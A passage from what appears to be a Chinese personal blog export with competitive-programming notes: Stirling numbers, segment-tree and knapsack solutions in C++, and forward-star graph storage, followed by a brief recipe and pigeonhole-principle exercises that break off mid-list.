<p><span class="math display">\[
|\bar{f_{i}} \cap \bar{f_{j}}| = (k - 2)^{n}
\]</span> 故<span class="math inline">\(\sum_{i = 1}^{k} |\bar{f_{i}}| =
C_{k}^{1}(k - 1)^{n}\)</span>，<span class="math inline">\(\sum_{i &lt;
j}^{i&lt;=k,j&lt;=k}|\bar{f_{i}}\cap\bar{f_{j}}| = C_{k}^{2}(k -
2)^{n}\)</span>依此类推，可以得到</p>
<p><span class="math display">\[
\begin{matrix}
|U - \bigcup_{i = 1}^{k}\bar{f_{i}}| &amp;=&amp; n^{k} - (C_{k}^{1}(k -
1)^{n} - C_{k}^{2}(k - 2)^{n} + (-1)^{i + 1}C_{k}^{i}(k - i)^{n} +
(-1)^(k + 1)C_{k}^{k}(0)^{n}) \\ &amp;=&amp; \sum_{i =
0}^{k}(-1)^{i}C_{k}^{i}(k - i)^{n};
\end{matrix}
\]</span> 消除盒子不同导致的差异，可得<span class="math inline">\(S(n,k)
= \frac{1}{k!}\sum_{i = 0}^{k}(-1)^{i}C_{k}^{i}(k -
i)^{n}\)</span>，<strong>注意式子中i从0开始</strong></p>
<h1 id="结论">结论</h1>
<p>如果组合数f(n,k)满足：<br />
<span class="math inline">\(f(n,k) = f(n-1,k-1) + k f(n -
1,k)\)</span><br />
则<span class="math inline">\(f(n,k) = \frac{1}{k!}\sum_{i =
0}^{k}(-1)^{i}C_{k}^{i}(k - i)^n\)</span>，如记<span
class="math inline">\(j = k - i\)</span>，则<span
class="math inline">\(i = k - j\)</span>，表达式可写为<span
class="math inline">\(\frac{1}{k!}\sum_{j = k}^{0}(-1)^{k -
j}C_{k}^{j}(j)^n\)</span></p>
<h1 id="例题-洛谷p6162-cnoi2020-四角链">例题 洛谷P6162 [Cnoi2020]
四角链</h1>
<p>有<span class="math inline">\(n -
1\)</span>个格子，每个格子编号为<span
class="math inline">\(1、2、3......n -
1\)</span>，现对每个格子填数，每个格子有以下要求：</p>
<ol type="1">
<li>格子可以不填数</li>
<li>格子可以填入小于等于自己编号的数</li>
<li>任意两个格子不能填相同的数</li>
</ol>
<p>如果令k个格子填入数字，那么有多少种填法。</p>
<h2 id="题解">题解</h2>
<p>首先可以得出一个递推式，n -
1个格子，填k个数的填法为T(n,k)中方案，那么根据最后一个格子的填数方案，则有最后一个格子填数和不填数两种方案。（由于要写递推式，形式为前n
- 1个格子由前n - 2个格子的情况推出，所以先假设前n -
2个格子都安排好了，这样在安排过程中条件宽松。可以尝试先安排最后一个格子的数，可以发现最后一个格子可以填n
- 1个数，但是无法得到前n -
2个元素的安排方案。可以总结出，先处理要求条件高的）。</p>
<ol type="1">
<li><p>最后一个格子不填数，则前n - 2个格子中有k个格子要填数，且n -
1无法填入前n - 2个格子中，故种类数为T(n - 1,k)</p></li>
<li><p>最后一个格子填数，则可填数字有n - 1个，但前n -
2个格子填数种类可能会收到限制。故先考虑前n - 2个格子填k - 1个数，剩下的n
- 1 - (k - 1)个可用数字填在最后一个格子中，故方案数为<span
class="math inline">\((n - k) T(n - 1,k - 1)\)</span></p></li>
</ol>
<p>最终得到 <span class="math display">\[
T(n,k) = (n - k) T(n - 1,k - 1) + T(n - 1, k)
\]</span></p>
<p>将<span class="math inline">\(T(n,k)\)</span>替换为<span
class="math inline">\(S(n,n - k)\)</span>，则有<span
class="math inline">\(T(n - 1,k - 1) = S(n - 1,n - 1 - (k -
1))\)</span>, <span class="math inline">\(T(n - 1,k) = S(n - 1, n - 1 -
k)\)</span></p>
<p><span class="math display">\[
S(n, n - k) = (n - k)S(n - 1,n - k) + S(n - 1,n - k - 1)
\]</span></p>
<p>S(n,k)递推式满足第二类stirling递推式，故答案为S(n,n - k);</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*================================================================</span></span><br><span class="line"><span class="comment">*   Copyright (C) 2024 Wang XinPeng. All rights reserved.</span></span><br><span class="line"><span class="comment">*   </span></span><br><span class="line"><span class="comment">*   filename:     p6162.cpp</span></span><br><span class="line"><span class="comment">*   username:     skt1faker</span></span><br><span class="line"><span class="comment">*   create time:  10:23  2024.05.09</span></span><br><span class="line"><span class="comment">*   modify time:  10:23  2024.05.09</span></span><br><span class="line"><span class="comment">*   email:        skk1faker@163.com</span></span><br><span class="line"><span class="comment">*   descripe:     </span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">================================================================*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> lll __int128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG0</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod1 = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">const</span> ll mod2 = <span class="number">998244353</span>;</span><br><span class="line"><span class="function">ll <span class="title">pow_</span><span class="params">(ll a, ll b = mod2 - <span class="number">2</span>)</span></span>&#123;</span><br><span class="line">  ll ans = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>(b)&#123;</span><br><span class="line">    <span class="keyword">if</span>(b &amp; <span class="number">1</span>)ans = (ans *  a) % mod2;</span><br><span class="line">    b /= <span class="number">2</span>;</span><br><span class="line">    a = (a * a) % mod2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">ll <span class="title">get_ans</span><span class="params">(ll n,ll k)</span></span>&#123;</span><br><span class="line">  ll ans = <span class="number">0</span>;</span><br><span class="line">  ll C = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span>(ll i = <span class="number">1</span>;i &lt;= k;i++)&#123;</span><br><span class="line">    C = (((C * (k - i + <span class="number">1</span>)) % mod2) * <span class="built_in">pow_</span>(i)) % mod2;</span><br><span class="line">    <span class="keyword">if</span>((k - i) &amp; <span class="number">1</span> )ans = (ans + (mod2 - ((C * <span class="built_in">pow_</span>(i,n)) % mod2)) % mod2) % mod2;</span><br><span class="line">    <span class="keyword">else</span> ans = (ans + (C * <span class="built_in">pow_</span>(i,n)) % mod2) % mod2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(ll i = <span class="number">1</span>;i &lt;= k;i++)&#123;</span><br><span class="line">    ans = (ans * <span class="built_in">pow_</span>(i)) % mod2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ll n,k;</span><br><span class="line">  cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line"></span><br><span class="line">  cout&lt;&lt;<span class="built_in">get_ans</span>(n,n - k)&lt;&lt;endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="参考资料">参考资料</h1>
<p><a
href="https://www.bananaspace.org/wiki/%E7%AC%AC%E4%BA%8C%E7%B1%BB_Stirling_%E6%95%B0">参考资料，第二类stirling数</a></p>
<a href="/2024/05/08/%E5%AE%B9%E6%96%A5%E5%8E%9F%E7%90%86/" title="容斥原理">本站容斥原理</a>
]]></content>
      <tags>
        <tag>数学</tag>
        <tag>acm</tag>
      </tags>
  </entry>
  <entry>
    <title>线段树中单点修改可能存在优化的点</title>
    <url>/2024/01/22/%E7%BA%BF%E6%AE%B5%E6%A0%91%E4%B8%AD%E5%8D%95%E7%82%B9%E4%BF%AE%E6%94%B9%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E4%BC%98%E5%8C%96%E7%9A%84%E7%82%B9/</url>
    <content><![CDATA[<h1 id="题意">题意</h1>
<p><a href="https://ac.nowcoder.com/acm/contest/73810/J">传送门</a></p>
<p>给一个序列a，和两种操作，操作如下</p>
<p>操作1：对一段区域的数[l,r]使用<span class="math inline">\(F(x) =
2\left\lfloor\frac{|x^{3} - 3x|}{x^{2} +
1}\right\rfloor\)</span>逐个处理。<br />
操作2：计算[l,r]区域里面的和。</p>
<p>序列n个数，共q个操作。<span class="math inline">\(n \leq
10^{5}，q\leq 3\times 10^{5}，a_{i} &lt; 10^{9}\)</span></p>
<h1 id="题解">题解</h1>
<p>观察式子F，区间修改的lazy操作是无法使用的，因为F操作lazy无法叠加，无法使用lazy快速计算sum，单点操作无法避免。但是可以发现<span
class="math inline">\(F(x) \approx 2\frac{x -
1}{3}\)</span>，所以x在不断缩小最终变为0，也就是说，一些元素经过一定次数的操作会变为0之后会已知不发生改变，所以一种新的lazy标记出现了，可以将一段区间是否为0作为标记，如果为0，则此区间的操作都可以取消。以此来优化操作，由于每个点最多操作c次，之后的区间操作一次为logn，所以时间复杂度为O(cn
+ qlog(n))。</p>
<p>代码如下: <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*================================================================</span></span><br><span class="line"><span class="comment">*   Copyright (C) 2024 Wangxinpeng. All rights reserved.</span></span><br><span class="line"><span class="comment">*   </span></span><br><span class="line"><span class="comment">*   filename：    J.cpp</span></span><br><span class="line"><span class="comment">*   username:     skt1faker</span></span><br><span class="line"><span class="comment">*   create time:  10:08  2024.01.21</span></span><br><span class="line"><span class="comment">    email:        skk1faker@163.com</span></span><br><span class="line"><span class="comment">*   descripe:     </span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">================================================================*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> L(value) (value &lt;&lt; 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R(value) ((L(value)) + 1)</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod1 = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod2 = <span class="number">998244353</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxx = (<span class="type">int</span>)<span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">ll <span class="title">F</span><span class="params">(ll x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span> * (<span class="built_in">abs</span>(x - <span class="number">1</span>) / <span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Point</span></span><br><span class="line">&#123;</span><br><span class="line">  ll sum;</span><br><span class="line">  <span class="type">bool</span> status;   <span class="comment">//true 表示全0</span></span><br><span class="line">&#125;tree[maxx &lt;&lt; <span class="number">2</span>];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">up</span><span class="params">(<span class="type">int</span> posi)</span></span>&#123;</span><br><span class="line">  tree[posi].sum = tree[<span class="built_in">L</span>(posi)].sum + tree[<span class="built_in">R</span>(posi)].sum;</span><br><span class="line">  tree[posi].status = tree[<span class="built_in">L</span>(posi)].status &amp;&amp; tree[<span class="built_in">R</span>(posi)].status;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">(<span class="type">int</span> now_posi,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(l == r)&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;tree[now_posi].sum);</span><br><span class="line">    tree[now_posi].status = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(tree[now_posi].sum == <span class="number">0</span>)tree[now_posi].status = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">init</span>(<span class="built_in">L</span>(now_posi),l,mid);</span><br><span class="line">  <span class="built_in">init</span>(<span class="built_in">R</span>(now_posi),mid + <span class="number">1</span>,r);</span><br><span class="line">  <span class="built_in">up</span>(now_posi); <span class="comment">// 上推</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">change</span><span class="params">(<span class="type">int</span> now_posi,<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> cl,<span class="type">int</span> cr)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(tree[now_posi].status)<span class="keyword">return</span> ;</span><br><span class="line">  <span class="keyword">if</span>(l == r)&#123;</span><br><span class="line">    tree[now_posi].sum = <span class="built_in">F</span>(tree[now_posi].sum);</span><br><span class="line">    <span class="keyword">if</span>(tree[now_posi].sum == <span class="number">0</span>)tree[now_posi].status = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="type">int</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span>(cl &lt;= mid)<span class="built_in">change</span>(<span class="built_in">L</span>(now_posi),l,mid,cl,cr);</span><br><span class="line">  <span class="keyword">if</span>(mid + <span class="number">1</span> &lt;= cr)<span class="built_in">change</span>(<span class="built_in">R</span>(now_posi),mid + <span class="number">1</span>,r,cl,cr);</span><br><span class="line">  <span class="built_in">up</span>(now_posi);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ll <span class="title">query</span><span class="params">(<span class="type">int</span> now_posi,<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> cl,<span class="type">int</span> cr)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(cl &lt;= l &amp;&amp; r &lt;= cr)&#123;</span><br><span class="line">    <span class="keyword">return</span> tree[now_posi].sum;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">  ll ans = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span>(cl &lt;= mid)ans += <span class="built_in">query</span>(<span class="built_in">L</span>(now_posi),l,mid,cl,cr);</span><br><span class="line">  <span class="keyword">if</span>(mid + <span class="number">1</span> &lt;= cr)ans += <span class="built_in">query</span>(<span class="built_in">R</span>(now_posi),mid + <span class="number">1</span>,r,cl,cr);</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> n,q;</span><br><span class="line">  cin&gt;&gt;n&gt;&gt;q;</span><br><span class="line">  <span class="built_in">init</span>(<span class="number">1</span>,<span class="number">0</span>,n - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; q;i++)&#123;</span><br><span class="line">    <span class="type">int</span> op,l,r;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;op,&amp;l,&amp;r);</span><br><span class="line">    l--,r--;</span><br><span class="line">    <span class="keyword">if</span>(op == <span class="number">1</span>)<span class="built_in">change</span>(<span class="number">1</span>,<span class="number">0</span>,n<span class="number">-1</span>,l,r);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      cout&lt;&lt;<span class="built_in">query</span>(<span class="number">1</span>,<span class="number">0</span>,n - <span class="number">1</span>,l,r)&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <tags>
        <tag>线段树</tag>
        <tag>单点修改</tag>
      </tags>
  </entry>
  <entry>
    <title>背包问题中当背包空间值过大，而价值的值较小应如果处理</title>
    <url>/2024/01/21/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98%E4%B8%AD%E5%BD%93%E8%83%8C%E5%8C%85%E7%A9%BA%E9%97%B4%E5%80%BC%E8%BF%87%E5%A4%A7%EF%BC%8C%E8%80%8C%E4%BB%B7%E5%80%BC%E7%9A%84%E5%80%BC%E8%BE%83%E5%B0%8F%E5%BA%94%E5%A6%82%E6%9E%9C%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<h1 id="题意">题意</h1>
<p>典型的背包问题，给出w,v数组，w表示重量，v表示价值，共n个物品，但是<span
class="math inline">\(\sum_{i = 1}^{n} w_{i} &lt; 1e9\)</span>，<span
class="math inline">\(\sum_{i = 1}^{n} v_{i} &lt; 1e6\)</span>。</p>
<p><a
href="https://ac.nowcoder.com/acm/contest/73810/I">题目传送门</a></p>
<h1 id="题解">题解</h1>
<p>可以发现传统背包中<code>dp[i][j]</code>表示前i个物品中，使用重量j的背包可以装载最大的价值数量，其空间复杂度和时间复杂度较大，需要转换思维。</p>
<p>可以将问题转换，使用<code>dp[i][j]</code>表示在前i个物品中，所得物品价值为j时使用最小的空间。</p>
<p>在查询W空间可以装载物品价值最大值时，需要遍历整个数组，<span
class="math inline">\(dp[n][j]\)</span>中j从最大值向0遍历，遇到第一个小于W对应的价值就是W对应最大价值。如果存在多次查询可以优化上述查询过程，由于遍历过程是在查找最后一个出现小于w的值，故可将ans[j]定义为<span
class="math inline">\(ans[j] = min_{i =
j}^{max\_val}(dp[n][i])\)</span>，则所得数组为一个递增数组，并且多段值分界点为w最小值最后一次出现的位置。之后通过二分查找就可完成查询。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*================================================================</span></span><br><span class="line"><span class="comment">*   Copyright (C) 2024 Wangxinpeng. All rights reserved.</span></span><br><span class="line"><span class="comment">*   </span></span><br><span class="line"><span class="comment">*   filename：    I.cpp</span></span><br><span class="line"><span class="comment">*   username:     skt1faker</span></span><br><span class="line"><span class="comment">*   create time:  16:20  2024.01.20</span></span><br><span class="line"><span class="comment">    email:        skk1faker@163.com</span></span><br><span class="line"><span class="comment">*   descripe:     </span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">================================================================*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG0</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod1 = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod2 = <span class="number">998244353</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxx = <span class="number">100</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxW = <span class="number">10001</span>;</span><br><span class="line"><span class="type">const</span> ll MAXVAL = (ll)<span class="number">1e12</span>;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">ll w[maxx],v[maxx];</span><br><span class="line">ll dp[maxx][maxW];</span><br><span class="line">ll ans[maxW];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  cin&gt;&gt;n;</span><br><span class="line">  <span class="type">int</span> sum_v = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt;= n;i++)&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld&quot;</span>,&amp;w[i],&amp;v[i]);</span><br><span class="line">    sum_v += v[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//memset(dp,0x3f3f3f3f,sizeof(dp));</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt;= n;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j &lt; maxW;j++)&#123;</span><br><span class="line">      dp[i][j] = MAXVAL;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt;= n;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j &lt;= sum_v;j++)&#123;</span><br><span class="line">      <span class="keyword">if</span>(j &gt;= v[i])&#123;</span><br><span class="line">        dp[i][j] = <span class="built_in">min</span>(dp[i - <span class="number">1</span>][j - v[i]] + w[i], dp[i - <span class="number">1</span>][j]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> </span><br><span class="line">        dp[i][j] = dp[i - <span class="number">1</span>][j];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ans[sum_v] = dp[n][sum_v]; </span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = sum_v - <span class="number">1</span>;i &gt;= <span class="number">0</span>;i--)&#123;</span><br><span class="line">    ans[i] = <span class="built_in">min</span>(ans[i + <span class="number">1</span>], dp[n][i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> Q;</span><br><span class="line">  cin&gt;&gt;Q;</span><br><span class="line">  <span class="keyword">while</span>(Q--)&#123;</span><br><span class="line">    ll W;</span><br><span class="line">    cin&gt;&gt;W;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>,r = sum_v;</span><br><span class="line">    <span class="keyword">while</span>(l &lt; r)&#123;</span><br><span class="line">      <span class="type">int</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">if</span>(ans[mid] &lt;= W)&#123;</span><br><span class="line">        l = mid + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> </span><br><span class="line">        r = mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(ans[l] &gt; W)</span><br><span class="line">      l--;</span><br><span class="line">    cout&lt;&lt;l&lt;&lt;endl;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>dp</tag>
        <tag>背包</tag>
      </tags>
  </entry>
  <entry>
    <title>蛋挞制作</title>
    <url>/2024/02/20/%E8%9B%8B%E6%8C%9E%E5%88%B6%E4%BD%9C/</url>
    <content><![CDATA[<ol type="1">
<li>中筋面粉 150g(可以使用一半低筋 + 一半高筋)</li>
<li>盐2g</li>
<li>水80g</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>链式前向星的优点</title>
    <url>/2024/05/05/%E9%93%BE%E5%BC%8F%E5%89%8D%E5%90%91%E6%98%9F%E7%9A%84%E4%BC%98%E7%82%B9/</url>
    <content><![CDATA[<h1 id="参考">参考</h1>
<p><a href="https://www.zhihu.com/question/59676094">参考</a></p>
<h1
id="链式前向星和vectorg存储对比">链式前向星和vector<edge>G存储对比</h1>
<p>链式前向星利用数组模拟链表的思路实现图的表示，此法有如下特点：</p>
<ol type="1">
<li><p>方便查找反向边</p>
<ul>
<li><code>vector&lt;edge&gt;G</code>，查找反向边<code>a--&gt;b</code>时需要遍历<code>G[a]</code>寻找此边，时间复杂度为n</li>
<li>链式前向星在插入边时，相邻的边在数组中相邻，<code>edge[i]</code>的反向边为<code>edge[i ^ 1]</code></li>
</ul></li>
<li><p>删边方便</p>
<ul>
<li>链式前向星删除边通过修改链表，如果是无向图还要找到相反的边删除链表，时间复杂度为<code>O(1)</code></li>
<li><code>vector</code>删除边可以做到O(1),例如删除<code>G[a][i]</code>代表的边，只需要将<code>swap(G[a][i],G[a][G[a].size() - 1])</code>，然后<code>G[a].pop_back()</code>。虽然删除做到了O(1)，但是无向图中删除还需要查找相应的反向边，查找时间复杂度为<code>O(n)</code>,
所以时间较长。</li>
</ul></li>
</ol>
<h1 id="链式向前星写法">链式向前星写法</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = (<span class="type">int</span>)<span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxx = (<span class="type">int</span>)<span class="number">1e6</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> tot;</span><br><span class="line"><span class="type">int</span> head[maxn];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    <span class="type">int</span> to;</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">    <span class="type">int</span> next_posi;</span><br><span class="line">&#125;;</span><br><span class="line">Edge edge[maxx];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add_edge</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b,<span class="type">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    edge[tot].next_posi = head[a];</span><br><span class="line">    edge[tot].to = b;</span><br><span class="line">    edge[tot].length = length;</span><br><span class="line">    head[a] = tot;</span><br><span class="line">    tot++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">(<span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">        head[i] = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>acm</tag>
        <tag>图论</tag>
      </tags>
  </entry>
  <entry>
    <title>鸽巢原理答案</title>
    <url>/2024/03/01/%E9%B8%BD%E5%B7%A2%E5%8E%9F%E7%90%86%E7%AD%94%E6%A1%88/</url>
    <content><![CDATA[<p>我看的是那本老外写的黑黑的书<a
href="https://detail.tmall.com/item.htm?spm=a220m.1000858.1000725.102.51932feelCtElu&amp;id=520373091579&amp;standard=1&amp;user_id=2455124912&amp;cat_id=2&amp;is_b=1&amp;rn=b8c59f9268deb18e6da60301e8eac103">《组合数学第五版》</a>。老外写书的时候答案好像没有怎么写，我作为<strong>帅B</strong>就帮大家写写吧（<strong>郑重声明</strong>：我不是卖书的就是给大家看看长啥样^_-）</p>
###
<center>
题目
<center>
<p>(题号与书上的题号对应，答案在后面）
 2.证明从1-200中取100个数且选取的这些数中有一个小于16，那么存在两个选取的整数，使得他们中的一个能被另一个整除。</p>
<p> 4.如果集合{1,2,,......2n}中选择n+1个整数总存在两个整数他们之间(<strong>没有“最多”二字</strong>)相差1。</p>
<p> 5.如果从集合{1,2,,......3n}中选择n+1个数那么么总存在两个数它们之间<strong>最多</strong>差2。</p>
<p> 7.对任意给定的52个数，要么二者的和能被100整除，要么二者的差能被100整除</p>
 8.利用鸽巢原理证明，有理数<span
class="math inline">\(\frac{m}{n}\)</span>展开的十进制小数是循环的。例如
<center>
<p><span
class="math inline">\(\frac{34478}{99900}=0.345,125,125,125,125,12.....\)</span></p>
<p> 9.一个房间有10个人，他们当中没有人超过60岁（年龄只能以整数给出）但又至少1岁.
  证明：
    （1）总能够找出两组人（两组人中不含相同的人），各组人的年龄和是相同的
    （2）题目中10不能换成更小的数</p>
<p> 10一个孩子每天看10个小时的电视，总共看7周，但是因为其父母的控制，任何一周看电视时间从不超过11个小时。
 证明：存在连续若干天，在此期间这个孩子恰好看了20个小时电视（假设看电视时间为整数）
 11.一个学生有37天准备考试。根据以往的经验，他知道他需要的学习时间不超过60小时，他还希望每天至少学习一小时。证明：无论她如何安排他的学习时间（每天的时间是一个整数），都存在连续的若干天，在此期间她学习了13个小时
 13.设S是平面上6各点的集合，其中没有三点共线。给出S的甸所确定的15条线段着色，将他们或者着成红色，或者着成蓝色证明：至少存在<strong>两个</strong>
三角形他们是红色的，或者是蓝色的，或者是红色和蓝色的（抱歉我发现我证错了，先空一下）
 14.一个袋子里面装了100个苹果、100个香蕉、100个橘子、100个梨。如果每分钟我们从中拿出一个水果，那木哦多久后对于一种水果我们拿出了12个
 15.对于任意 n+1整数<span
class="math inline">\(a_{1},a_{2}.....a_{n+1}\)</span>存在两个正整数<span
class="math inline">\(a_{i}\)</span>和<span
class="math inline">\(a_{j}\)</span>使得<span
class="math inline">\(a_{i}-a{j}\)</span>被100整除。
 16.证明：在一群n&gt;1个人中，存在两个人他们在这群人中有相同的熟人（假设自己不是自己的熟人）
 17.有一个100人的聚会，每个人都有偶数（可以是0）个熟人。证明：在这次聚会上有3个人，其熟人数量相等。
 18.证明：在边长等于2的正方形中任选5个点，它们当中存在2个点镇两个点的距离最多是<span
class="math inline">\(\sqrt{2}\)</span>
 19.(a)证明：在边长为1的等边三角形中任意选择5个点存在两个点，期间距至多为<span
